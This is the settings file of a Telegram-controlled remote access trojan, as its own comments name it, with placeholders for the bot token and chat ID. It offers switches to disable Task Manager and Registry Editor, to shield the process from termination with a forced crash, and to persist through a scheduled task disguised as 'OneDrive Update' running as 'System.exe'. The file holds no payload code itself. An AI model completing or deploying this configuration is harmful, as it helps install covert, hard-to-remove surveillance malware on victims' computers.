from API import *


# Token/ID
TelegramToken = 'TOKEN'
TelegramChatID = 'ID'


# Run the script as administrator
AdminRightsRequired = False

# Disable Task Manager at first start
DisableTaskManager = False
# Disable Registry Editor at first start
DisableRegistryTools = False

# Process protection from termination and deletion
ProcessBSODProtectionEnabled = False


# Add to startup at first start
AutorunEnabled = False
# Installation directory
InstallPath = 'C:\\ProgramData\\'
# Task name in Task Scheduler
AutorunName = 'OneDrive Update'
# The name of the process in the Task Manager
ProcessName = 'System.exe'


# Display a message at first start
DisplayMessageBox = False
# Your Message (will be displayed at start)
Message = 'Message'


# Directory for saving trojan temporary files
Directory = 'C:\\Windows\\Temp\\TelegramRAT\\'